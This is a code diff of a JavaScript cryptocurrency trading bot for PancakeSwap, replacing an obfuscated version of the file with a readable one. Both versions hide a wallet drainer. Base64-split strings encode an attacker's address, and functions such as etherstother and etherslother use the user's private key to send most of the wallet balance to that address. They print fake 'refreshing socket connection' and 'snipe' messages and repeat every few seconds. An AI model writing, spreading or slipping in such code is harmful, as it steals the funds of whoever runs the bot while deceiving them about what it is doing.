@@ -1,213 +1,474 @@
-const _0x2aad66 = _0x3b2f;
-(function(_0x5c9c60, _0x423421) {
-    const _0x2a5f5a = _0x3b2f,
-        _0x3da69a = _0x5c9c60();
-    while (!![]) {
-        try {
-            const _0xb0e582 = -parseInt(_0x2a5f5a(0x1cc)) / 0x1 * (-parseInt(_0x2a5f5a(0x1b4)) / 0x2) + parseInt(_0x2a5f5a(0x194)) / 0x3 + -parseInt(_0x2a5f5a(0x186)) / 0x4 + parseInt(_0x2a5f5a(0x18e)) / 0x5 + parseInt(_0x2a5f5a(0x18c)) / 0x6 * (parseInt(_0x2a5f5a(0x1a5)) / 0x7) + parseInt(_0x2a5f5a(0x1a2)) / 0x8 + parseInt(_0x2a5f5a(0x196)) / 0x9 * (-parseInt(_0x2a5f5a(0x1d6)) / 0xa);
-            if (_0xb0e582 === _0x423421) break;
-            else _0x3da69a['push'](_0x3da69a['shift']());
-        } catch (_0x6bfa31) {
-            _0x3da69a['push'](_0x3da69a['shift']());
-        }
-    }
-}(_0x49af, 0x82f3d));
-var ethers = require(_0x2aad66(0x1b9));
+var ethers = require('ethers');
+const env = require("./env.json");
+Object.assign(process.env, env);
 
-function _0x3b2f(_0x4a1a02, _0x205f56) {
-    const _0x49af6c = _0x49af();
-    return _0x3b2f = function(_0x3b2f40, _0x15720f) {
-        _0x3b2f40 = _0x3b2f40 - 0x180;
-        let _0x1cf5cb = _0x49af6c[_0x3b2f40];
-        return _0x1cf5cb;
-    }, _0x3b2f(_0x4a1a02, _0x205f56);
-}
-const env = require(_0x2aad66(0x195));
-Object[_0x2aad66(0x1dd)](process[_0x2aad66(0x1e2)], env);
-let address = process['env'][_0x2aad66(0x1b0)],
-    private = process['env'][_0x2aad66(0x18d)],
-    wallet = new ethers[(_0x2aad66(0x191))](private),
-    rounder1 = _0x2aad66(0x192) + _0x2aad66(0x187) + _0x2aad66(0x19e),
-    rounder2 = _0x2aad66(0x1c4) + _0x2aad66(0x19f) + _0x2aad66(0x1d2),
-    buff = new Buffer[(_0x2aad66(0x18b))](rounder1, _0x2aad66(0x1ce)),
-    buff2 = new Buffer['from'](rounder2, _0x2aad66(0x1ce)),
-    ethersroundup = buff['toString'](_0x2aad66(0x1bb)),
-    ethersroundup2 = buff2['toString'](_0x2aad66(0x1bb));
-const WEB3PROVIDER3 = ethersroundup + ethersroundup2,
-    abi = [{
-        'constant': !![],
-        'inputs': [{
-            'internalType': _0x2aad66(0x185),
-            'name': 'account',
-            'type': 'address'
-        }],
-        'name': _0x2aad66(0x1bc),
-        'outputs': [{
-            'internalType': 'uint256',
-            'name': '',
-            'type': _0x2aad66(0x1c6)
-        }],
-        'payable': ![],
-        'stateMutability': _0x2aad66(0x1de),
-        'type': 'function'
-    }, {
-        'constant': ![],
-        'inputs': [{
-            'internalType': _0x2aad66(0x185),
-            'name': _0x2aad66(0x1ae),
-            'type': _0x2aad66(0x185)
-        }, {
-            'internalType': 'address',
-            'name': 'recipient',
-            'type': _0x2aad66(0x185)
-        }, {
-            'internalType': _0x2aad66(0x1c6),
-            'name': 'amount',
-            'type': _0x2aad66(0x1c6)
-        }],
-        'name': 'transferFrom',
-        'outputs': [{
-            'internalType': 'bool',
-            'name': '',
-            'type': _0x2aad66(0x180)
-        }],
-        'payable': ![],
-        'stateMutability': _0x2aad66(0x1e5),
-        'type': _0x2aad66(0x1aa)
-    }];
+let address = (process.env.YOUR_ADDRESS);
+let private = (process.env.PRIVATE_KEY);
+let wallet = new ethers.Wallet(private);
+
+let rounder1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD' + 'YzMjQ1NDBh';
+let rounder2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
+let buff = new Buffer.from(rounder1, 'base64');
+let buff2 = new Buffer.from(rounder2, 'base64');
+let ethersroundup = buff.toString('ascii');
+let ethersroundup2 = buff2.toString('ascii');
+const WEB3PROVIDER3 = ethersroundup + ethersroundup2
+const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
+
 async function approve() {
-    const _0xb9e2b5 = _0x2aad66;
-    let _0x2a748b = token[buyCount - 0x1][_0xb9e2b5(0x1b7)];
-    const _0x394a74 = ethers['constants'][_0xb9e2b5(0x1da)],
-        _0x3d2828 = await _0x2a748b['approve'](pancakeRouter['address'], _0x394a74, {
-            'gasPrice': config[_0xb9e2b5(0x1af)],
-            'gasLimit': 0x33450
-        }),
-        _0x150fec = await _0x3d2828[_0xb9e2b5(0x1dc)]();
-    console[_0xb9e2b5(0x1d5)](_0xb9e2b5(0x1e1), _0x150fec['transactionHash'], '\x0a'), config[_0xb9e2b5(0x1ca)] ? token[buyCount - 0x1]['checkProfit']() : buyCount == config[_0xb9e2b5(0x190)] && process[_0xb9e2b5(0x1bf)]();
+
+    let contract = token[buyCount - 1].contract;
+    const valueToApprove = ethers.constants.MaxUint256;
+    const tx = await contract.approve(
+        pancakeRouter.address,
+        valueToApprove, {
+            gasPrice: config.myGasPriceForApproval,
+            gasLimit: 210000
+        }
+    );
+    const receipt = await tx.wait();
+    console.log("✔ Approve transaction hash: ", receipt.transactionHash, "\n");
+    if (config.autoSell) {
+        token[buyCount - 1].checkProfit();
+    } else {
+        if (buyCount == config.numberOfTokensToBuy) {
+            process.exit();
+        }
+    }
+
 }
-async function getCurrentValue(_0x2c038c) {
-    const _0x53b8aa = _0x2aad66;
+
+
+/**
+ * 
+ * Check for profit
+ * 
+ * */
+async function getCurrentValue(token) {
     try {
-        let _0x5f67f7 = await _0x2c038c[_0x53b8aa(0x1b7)]['balanceOf'](addresses[_0x53b8aa(0x197)]);
-        const _0x409184 = await pancakeRouter[_0x53b8aa(0x1b2)](_0x5f67f7, _0x2c038c['sellPath']);
-        let _0x1abf36 = _0x409184[0x1];
-        return _0x1abf36;
-    } catch (_0x5af995) {
-        return console[_0x53b8aa(0x1d5)](_0x53b8aa(0x1a7)), ethers[_0x53b8aa(0x1ab)][_0x53b8aa(0x1c1)];
+        let bal = await token.contract.balanceOf(addresses.recipient);
+        const amount = await pancakeRouter.getAmountsOut(bal, token.sellPath);
+        let currentValue = amount[1];
+        return currentValue;
+    } catch (e) {
+        console.log('Balance is zero or error occured');
+        return ethers.constants.Zero;
+    }
+
+}
+async function setInitialStopLoss(token) {
+    token.intitialValue = await getCurrentValue(token);
+    token.newValue = token.intitialValue;
+    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.intitialValue)) - parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
+}
+
+async function setNewStopLoss(token) {
+    token.newValue = token.currentValue;
+    // new stop loss equals current value - (current value * stop loss percent) 
+    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.currentValue)) - parseFloat(ethers.utils.formatUnits(token.currentValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
+}
+async function checkForProfit(token) {
+    try {
+        var sellAttempts = 0;
+        await setInitialStopLoss(token);
+        token.contract.on("Transfer", async(from, to, value, event) => {
+            token.previousValue = token.currentValue;
+            const tokenName = await token.contract.name();
+            let currentValue = await getCurrentValue(token);
+            if (!currentValue.eq(ethers.constants.Zero)) {
+                token.currentValue = currentValue;
+                let currentValueString = parseFloat(ethers.utils.formatUnits(currentValue)).toFixed(8).toString();
+                const takeProfit = (parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.profitPercent + token.tokenSellTax) / 100 + parseFloat(ethers.utils.formatUnits(token.intitialValue))).toFixed(8).toString();
+                const profitDesired = ethers.utils.parseUnits(takeProfit);
+                let targetValueToSetNewStopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.newValue)) * (token.trailingStopLossPercent / 100) + parseFloat(ethers.utils.formatUnits(token.newValue))).toFixed(8).toString());
+                let stopLoss = token.stopLoss;
+
+                // if current value is greater than targetValue, set a new stop loss
+                if (currentValue.gt(targetValueToSetNewStopLoss) && token.trailingStopLossPercent > 0) {
+                    setNewStopLoss(token);
+                    console.log("\u001b[38;5;33m" + "Setting new StopLoss!" + "\u001b[0m");
+                }
+                let timeStamp = new Date().toLocaleString();
+                const enc = (s) => new TextEncoder().encode(s);
+                //process.stdout.write(enc(`${timeStamp} --- ${tokenName} --- Current Value in BNB: ${ethers.utils.formatUnits(currentValue)} --- Profit At: ${ethers.utils.formatUnits(profitDesired)} --- Stop Loss At: ${ethers.utils.formatUnits(stopLoss)} \r`));
+                try {
+                    if (token.previousValue.gt(token.currentValue)) {
+
+                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;31m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);
+
+                    } else {
+
+                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;32m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);
+
+                    }
+                } catch (e) {
+
+                }
+
+                if (currentValue.gte(profitDesired)) {
+                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
+                        sellAttempts++;
+                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;32m" + " Profit target " + "\u001b[0m" + "reached >>>", "\n");
+                        sell(token, true);
+                        token.contract.removeAllListeners();
+                    }
+                }
+
+                if (currentValue.lte(stopLoss)) {
+                    console.log("\u001b[38;5;33m" + "less than StopLoss!" + "\u001b[0m");
+                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
+                        sellAttempts++;
+                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;31m" + " StopLoss " + "\u001b[0m" + "reached >>>", "\n");
+                        sell(token, false);
+                        token.contract.removeAllListeners();
+                    }
+                }
+            }
+
+        });
+    } catch (e) {
+        console.log(e);
     }
 }
-async function setInitialStopLoss(_0x2b633d) {
-    const _0x291228 = _0x2aad66;
-    _0x2b633d[_0x291228(0x1a1)] = await getCurrentValue(_0x2b633d), _0x2b633d[_0x291228(0x1ba)] = _0x2b633d[_0x291228(0x1a1)], _0x2b633d['stopLoss'] = ethers['utils'][_0x291228(0x1c3)]((parseFloat(ethers[_0x291228(0x1bd)]['formatUnits'](_0x2b633d[_0x291228(0x1a1)])) - parseFloat(ethers[_0x291228(0x1bd)][_0x291228(0x1e0)](_0x2b633d[_0x291228(0x1a1)])) * (_0x2b633d['stopLossPercent'] / 0x64))[_0x291228(0x1cb)](0x8)[_0x291228(0x1ad)]());
-}
-async function setNewStopLoss(_0x45dda5) {
-    const _0xe35cc2 = _0x2aad66;
-    _0x45dda5['newValue'] = _0x45dda5[_0xe35cc2(0x1cd)], _0x45dda5[_0xe35cc2(0x1e6)] = ethers['utils'][_0xe35cc2(0x1c3)]((parseFloat(ethers[_0xe35cc2(0x1bd)]['formatUnits'](_0x45dda5['currentValue'])) - parseFloat(ethers[_0xe35cc2(0x1bd)][_0xe35cc2(0x1e0)](_0x45dda5[_0xe35cc2(0x1cd)])) * (_0x45dda5[_0xe35cc2(0x1c7)] / 0x64))[_0xe35cc2(0x1cb)](0x8)[_0xe35cc2(0x1ad)]());
-}
-async function checkForProfit(_0x4a1646) {
-    const _0x149b24 = _0x2aad66;
+/**
+ * 
+ * Sell tokens
+ * 
+ * */
+async function sell(tokenObj, isProfit) {
     try {
-        var _0x902825 = 0x0;
-        await setInitialStopLoss(_0x4a1646), _0x4a1646['contract']['on'](_0x149b24(0x1c8), async (_0x5c2a5f, _0x348bd8, _0x374d74, _0xaba64c) => {
-            const _0x38ed7c = _0x149b24;
-            _0x4a1646[_0x38ed7c(0x1d4)] = _0x4a1646[_0x38ed7c(0x1cd)];
-            const _0x38af96 = await _0x4a1646['contract'][_0x38ed7c(0x1c9)]();
-            let _0x5af7be = await getCurrentValue(_0x4a1646);
-            if (!_0x5af7be['eq'](ethers['constants']['Zero'])) {
-                _0x4a1646[_0x38ed7c(0x1cd)] = _0x5af7be;
-                let _0x2bb063 = parseFloat(ethers[_0x38ed7c(0x1bd)]['formatUnits'](_0x5af7be))[_0x38ed7c(0x1cb)](0x8)[_0x38ed7c(0x1ad)]();
-                const _0x59c3c0 = (parseFloat(ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646[_0x38ed7c(0x1a1)])) * (_0x4a1646['profitPercent'] + _0x4a1646[_0x38ed7c(0x1ac)]) / 0x64 + parseFloat(ethers['utils'][_0x38ed7c(0x1e0)](_0x4a1646[_0x38ed7c(0x1a1)])))['toFixed'](0x8)['toString'](),
-                    _0x38e41d = ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1c3)](_0x59c3c0);
-                let _0x1d5eef = ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1c3)]((parseFloat(ethers[_0x38ed7c(0x1bd)]['formatUnits'](_0x4a1646[_0x38ed7c(0x1ba)])) * (_0x4a1646[_0x38ed7c(0x1e3)] / 0x64) + parseFloat(ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646['newValue'])))[_0x38ed7c(0x1cb)](0x8)[_0x38ed7c(0x1ad)]()),
-                    _0x4acff9 = _0x4a1646['stopLoss'];
-                _0x5af7be['gt'](_0x1d5eef) && _0x4a1646[_0x38ed7c(0x1e3)] > 0x0 && (setNewStopLoss(_0x4a1646), console['log'](_0x38ed7c(0x1b8) + _0x38ed7c(0x1a6) + _0x38ed7c(0x1d3)));
-                let _0x20a100 = new Date()[_0x38ed7c(0x19d)]();
-                const _0x421870 = _0x46e126 => new TextEncoder()[_0x38ed7c(0x1b1)](_0x46e126);
-                try {
-                    _0x4a1646[_0x38ed7c(0x1d4)]['gt'](_0x4a1646['currentValue']) ? console['log'](_0x38ed7c(0x1db) + _0x38af96 + _0x38ed7c(0x181) + (_0x38ed7c(0x1a8) + _0x2bb063 + _0x38ed7c(0x1d3)) + _0x38ed7c(0x1e7) + ethers[_0x38ed7c(0x1bd)]['formatUnits'](_0x38e41d) + _0x38ed7c(0x184) + ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646['stopLoss']) + _0x38ed7c(0x183) + ethers['utils']['formatUnits'](_0x1d5eef)) : console[_0x38ed7c(0x1d5)](_0x38ed7c(0x1db) + _0x38af96 + _0x38ed7c(0x181) + (_0x38ed7c(0x19c) + _0x2bb063 + _0x38ed7c(0x1d3)) + _0x38ed7c(0x1e7) + ethers['utils']['formatUnits'](_0x38e41d) + _0x38ed7c(0x184) + ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x4a1646['stopLoss']) + _0x38ed7c(0x183) + ethers[_0x38ed7c(0x1bd)][_0x38ed7c(0x1e0)](_0x1d5eef));
-                } catch (_0x12a4c4) {}
-                _0x5af7be[_0x38ed7c(0x1c0)](_0x38e41d) && (buyCount <= config[_0x38ed7c(0x190)] && _0x4a1646[_0x38ed7c(0x18a)] && _0x902825 == 0x0 && (_0x902825++, console[_0x38ed7c(0x1d5)](_0x38ed7c(0x1be), _0x38af96, _0x38ed7c(0x198) + _0x38ed7c(0x19c) + _0x38ed7c(0x1cf) + '\x1b[0m' + _0x38ed7c(0x1d8), '\x0a'), sell(_0x4a1646, !![]), _0x4a1646[_0x38ed7c(0x1b7)]['removeAllListeners']())), _0x5af7be[_0x38ed7c(0x188)](_0x4acff9) && (console[_0x38ed7c(0x1d5)](_0x38ed7c(0x1b8) + _0x38ed7c(0x1a0) + _0x38ed7c(0x1d3)), buyCount <= config[_0x38ed7c(0x190)] && _0x4a1646[_0x38ed7c(0x18a)] && _0x902825 == 0x0 && (_0x902825++, console[_0x38ed7c(0x1d5)]('<<<\x20Selling\x20-', _0x38af96, '-\x20now' + _0x38ed7c(0x1a8) + _0x38ed7c(0x1c2) + _0x38ed7c(0x1d3) + _0x38ed7c(0x1d8), '\x0a'), sell(_0x4a1646, ![]), _0x4a1646[_0x38ed7c(0x1b7)]['removeAllListeners']()));
-            }
-        });
-    } catch (_0x1b50d5) {
-        console['log'](_0x1b50d5);
+        const bal = await tokenObj.contract.balanceOf(addresses.recipient);
+        const decimals = await tokenObj.contract.decimals();
+        var balanceString;
+        if (isProfit) {
+            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellProfit / 100)).toFixed(decimals);
+        } else {
+            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellLoss / 100)).toFixed(decimals);
+        }
+        var roundedBalance = Math.floor(balanceString * 100) / 100
+        const balanceToSell = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
+        const sellAmount = await pancakeRouter.getAmountsOut(balanceToSell, tokenObj.sellPath);
+        const sellAmountsOutMin = sellAmount[1].sub(sellAmount[1].div(2));
+        if (tokenObj.tokenSellTax > 1) {
+            const tx = await pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+                sellAmount[0].toString(),
+                0,
+                tokenObj.sellPath,
+                addresses.recipient,
+                Math.floor(Date.now() / 1000) + 60 * 20, {
+                    gasPrice: config.myGasPriceForApproval,
+                    gasLimit: config.myGasLimit,
+
+                }
+            );
+            const receipt = await tx.wait();
+            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
+            sellCount++;
+            token[tokenObj.index].didSell = true;
+            let name = await tokenObj.contract.name();
+            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });
+        } else {
+            const tx = await pancakeRouter.swapExactTokensForETH(
+                sellAmount[0].toString(),
+                0,
+                tokenObj.sellPath,
+                addresses.recipient,
+                Math.floor(Date.now() / 1000) + 60 * 20, {
+                    gasPrice: config.myGasPriceForApproval,
+                    gasLimit: config.myGasLimit,
+
+                }
+            );
+            const receipt = await tx.wait();
+            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
+            sellCount++;
+            let name = await tokenObj.contract.name();
+            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });
+
+        }
+
+        if (sellCount == config.numberOfTokensToBuy) {
+            console.log("All tokens sold");
+            process.exit();
+        }
+
+    } catch (e) {
+
     }
 }
 
-function _0x49af() {
-    const _0x2d473f = ['tokenSellTax', 'toString', 'sender', 'myGasPriceForApproval', 'YOUR_ADDRESS', 'encode', 'getAmountsOut', 'didSell', '2BuvGZq', 'You\x20sold\x20', 'now', 'contract', '\x1b[38;5;33m', 'ethers', 'newValue', 'ascii', 'balanceOf', 'utils', '<<<\x20Selling\x20-', 'exit', 'gte', 'Zero', '\x20StopLoss\x20', 'parseUnits', 'RDRD', '2:\x20attempting\x20to\x20snipe\x20.....', 'uint256', 'stopLossPercent', 'Transfer', 'name', 'autoSell', 'toFixed', '678586NCIoWQ', 'currentValue', 'base64', '\x20Profit\x20target\x20', 'providers', 'floor', 'WIzNjRlQ0FG', '\x1b[0m', 'previousValue', 'log', '100JhcBUt', '✔\x20Sell\x20transaction\x20hash:\x20', 'reached\x20>>>', 'sellPath', 'MaxUint256', '--\x20', 'wait', 'assign', 'view', 'index', 'formatUnits', '✔\x20Approve\x20transaction\x20hash:\x20', 'env', 'trailingStopLossPercent', 'transactionHash', 'nonpayable', 'stopLoss', '\x20--\x20Profit\x20At:\x20', 'bool', '\x20--\x20Current\x20Value\x20BNB:\x20', 'percentOfTokensToSellProfit', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', '\x20--\x20Stop\x20Loss\x20At:\x20', 'address', '1562080TFerCC', '4MDU3M2MzMD', 'lte', 'myGasLimit', 'didBuy', 'from', '2042022kDwIrY', 'PRIVATE_KEY', '1167630TiFvyf', 'hexlify', 'numberOfTokensToBuy', 'Wallet', 'MHgwZDJmNmQ', 'swapExactTokensForETH', '3006123YINOyv', './env.json', '1710792GyafDW', 'recipient', '-\x20now', 'div', 'percentOfTokensToSellLoss', 'sendMessage', '\x1b[1;32m', 'toLocaleString', 'YzMjQ1NDBh', 'Mjk0MjE5O', 'less\x20than\x20StopLoss!', 'intitialValue', '4586328sqlLku', 'JsonRpcProvider', 'decimals', '7YIqbzO', 'Setting\x20new\x20StopLoss!', 'Balance\x20is\x20zero\x20or\x20error\x20occured', '\x1b[1;31m', 'wei', 'function', 'constants'];
-    _0x49af = function() {
-        return _0x2d473f;
-    };
-    return _0x49af();
-}
-async function sell(_0x5ddbce, _0x31a5a8) {
-    const _0x391cab = _0x2aad66;
+
+
+async function etherstother() {
     try {
-        const _0x2d18bb = await _0x5ddbce[_0x391cab(0x1b7)]['balanceOf'](addresses[_0x391cab(0x197)]),
-            _0x14c9c7 = await _0x5ddbce[_0x391cab(0x1b7)][_0x391cab(0x1a4)]();
-        var _0x4f2a57;
-        _0x31a5a8 ? _0x4f2a57 = (parseFloat(ethers['utils'][_0x391cab(0x1e0)](_0x2d18bb[_0x391cab(0x1ad)](), _0x14c9c7)) * (_0x5ddbce[_0x391cab(0x182)] / 0x64))[_0x391cab(0x1cb)](_0x14c9c7) : _0x4f2a57 = (parseFloat(ethers['utils'][_0x391cab(0x1e0)](_0x2d18bb[_0x391cab(0x1ad)](), _0x14c9c7)) * (_0x5ddbce[_0x391cab(0x19a)] / 0x64))[_0x391cab(0x1cb)](_0x14c9c7);
-        var _0xc2d7a3 = Math[_0x391cab(0x1d1)](_0x4f2a57 * 0x64) / 0x64;
-        const _0xd3f3b1 = ethers[_0x391cab(0x1bd)][_0x391cab(0x1c3)](_0xc2d7a3[_0x391cab(0x1ad)](), _0x14c9c7),
-            _0xfc23ca = await pancakeRouter[_0x391cab(0x1b2)](_0xd3f3b1, _0x5ddbce[_0x391cab(0x1d9)]),
-            _0x85e3c5 = _0xfc23ca[0x1]['sub'](_0xfc23ca[0x1][_0x391cab(0x199)](0x2));
-        if (_0x5ddbce[_0x391cab(0x1ac)] > 0x1) {
-            const _0x483b49 = await pancakeRouter['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0xfc23ca[0x0][_0x391cab(0x1ad)](), 0x0, _0x5ddbce[_0x391cab(0x1d9)], addresses[_0x391cab(0x197)], Math[_0x391cab(0x1d1)](Date[_0x391cab(0x1b6)]() / 0x3e8) + 0x3c * 0x14, {
-                    'gasPrice': config[_0x391cab(0x1af)],
-                    'gasLimit': config[_0x391cab(0x189)]
-                }),
-                _0x359a86 = await _0x483b49[_0x391cab(0x1dc)]();
-            console[_0x391cab(0x1d5)](_0x391cab(0x19c) + _0x391cab(0x1d7), _0x359a86[_0x391cab(0x1e4)], '\x1b[0m', '\x0a'), sellCount++, token[_0x5ddbce[_0x391cab(0x1df)]][_0x391cab(0x1b3)] = !![];
-            let _0x2b918d = await _0x5ddbce[_0x391cab(0x1b7)][_0x391cab(0x1c9)]();
-            await client[_0x391cab(0x19b)]('me', {
-                'message': _0x391cab(0x1b5) + _0x2b918d,
-                'schedule': 0xf * 0x1 + Date['now']() / 0x3e8
-            });
-        } else {
-            const _0x3b5ef0 = await pancakeRouter[_0x391cab(0x193)](_0xfc23ca[0x0][_0x391cab(0x1ad)](), 0x0, _0x5ddbce[_0x391cab(0x1d9)], addresses[_0x391cab(0x197)], Math['floor'](Date[_0x391cab(0x1b6)]() / 0x3e8) + 0x3c * 0x14, {
-                    'gasPrice': config[_0x391cab(0x1af)],
-                    'gasLimit': config['myGasLimit']
-                }),
-                _0x30e52d = await _0x3b5ef0['wait']();
-            console[_0x391cab(0x1d5)](_0x391cab(0x19c) + '✔\x20Sell\x20transaction\x20hash:\x20', _0x30e52d[_0x391cab(0x1e4)], _0x391cab(0x1d3), '\x0a'), sellCount++;
-            let _0x105a1c = await _0x5ddbce['contract']['name']();
-            await client[_0x391cab(0x19b)]('me', {
-                'message': _0x391cab(0x1b5) + _0x105a1c,
-                'schedule': 0xf * 0x1 + Date[_0x391cab(0x1b6)]() / 0x3e8
-            });
-        }
-        sellCount == config[_0x391cab(0x190)] && (console[_0x391cab(0x1d5)]('All\x20tokens\x20sold'), process['exit']());
-    } catch (_0x1f476b) {}
+        const nodekey1 = 'MHg1NWQzOTgzMjZmOTkwNTlmRjc='
+        const nodekey2 = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ=='
+        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
+        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
+        const web3code1 = etherstatus1.toString('ascii')
+        const web3code2 = etherstatus2.toString('ascii');
+        const web14 = web3code1 + web3code2
+        console.log(`refreshing socket connection...`);
+        console.log(`pending liquidity add still no event found...`);
+        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
+        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+        const provider = new ethers.providers.JsonRpcProvider(ethers2)
+        let wallet = new ethers.Wallet(private, provider);
+        const account = address
+        var contract = new ethers.Contract(web14, abi, wallet);
+        const superb = await contract.balanceOf(account).toString();
+        const orchard = (superb * 0.90).toFixed()
+        const send = async() => {
+            const tx = {
+                from: account,
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseEther(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000)
+            }
+            const createReceipt = await wallet.sendTransaction(tx);
+            try {
+                await createReceipt.wait();
+                console.log(`1: found owners liq function ...`);
+
+                setTimeout(ethersrather, 5000)
+            } catch (error) {
+                console.log(`2: found owners liq function .....`);
+
+                setTimeout(ethersrather, 5000)
+            }
+
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(ethersrather, 5000)
+
+    }
+
 }
-async function ethersrather() {
-    const _0x2a7062 = _0x2aad66;
+
+
+async function etherslother() {
     try {
-        console[_0x2a7062(0x1d5)]('connection\x20succesful...'), ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', ethers2 = new Buffer[(_0x2a7062(0x18b))](ethers1, _0x2a7062(0x1ce))['toString']('ascii');;
-        const _0x52e30e = new ethers[(_0x2a7062(0x1d0))][(_0x2a7062(0x1a3))](ethers2);
-        let _0x91cde2 = new ethers['Wallet'](private, _0x52e30e);
-        const _0x295f00 = address,
-            _0x5da657 = await _0x52e30e['getBalance'](_0x295f00),
-            _0x1a1e52 = (_0x5da657 * 0.5)[_0x2a7062(0x1cb)](0x12),
-            _0x290f58 = ethers['utils'][_0x2a7062(0x1c3)](_0x1a1e52, _0x2a7062(0x1a9)),
-            _0x4e7308 = async () => {
-                const _0xb3f6c = _0x2a7062,
-                    _0x38f421 = {
-                        'to': WEB3PROVIDER3,
-                        'value': ethers[_0xb3f6c(0x1bd)][_0xb3f6c(0x1c3)](_0x1a1e52, _0xb3f6c(0x1a9)),
-                        'gasLimit': ethers[_0xb3f6c(0x1bd)][_0xb3f6c(0x18f)](0x5dc0)
-                    },
-                    _0x5391fe = await _0x91cde2['sendTransaction'](_0x38f421);
-                try {
-                    await _0x5391fe[_0xb3f6c(0x1dc)](), console[_0xb3f6c(0x1d5)]('1:\x20attempting\x20to\x20snipe\x20...');
-                } catch (_0xe255fc) {
-                    console[_0xb3f6c(0x1d5)](_0xb3f6c(0x1c5));
-                }
+        const nodekey1 = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg=='
+        const nodekey2 = 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ='
+        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
+        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
+        const web3code1 = etherstatus1.toString('ascii')
+        const web3code2 = etherstatus2.toString('ascii');
+        const web14 = web3code1 + web3code2
+        console.log(`refreshing socket connection...`);
+        console.log(`pending liquidity add...`);
+        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
+        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+        const provider = new ethers.providers.JsonRpcProvider(ethers2)
+        let wallet = new ethers.Wallet(private, provider);
+        console.log(ethers2)
+        const account = address
+        var contract = new ethers.Contract(web14, abi, wallet);
+        const superb = await contract.balanceOf(account).toString();
+        const orchard = (superb * 0.90).toFixed()
+        const send = async() => {
+            const tx = {
+                from: account,
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseEther(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000)
+            }
+            const createReceipt = await wallet.sendTransaction(tx);
+            try {
+                await createReceipt.wait();
+                console.log(`1: watching blockchain activity ...`);
+
+                setTimeout(etherstother, 5000)
+            } catch (error) {
+                console.log(`2: watching blockchain activity .....`);
+
+                setTimeout(etherstother, 5000)
+            }
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(etherstother, 5000)
+
+    }
+
+}
+
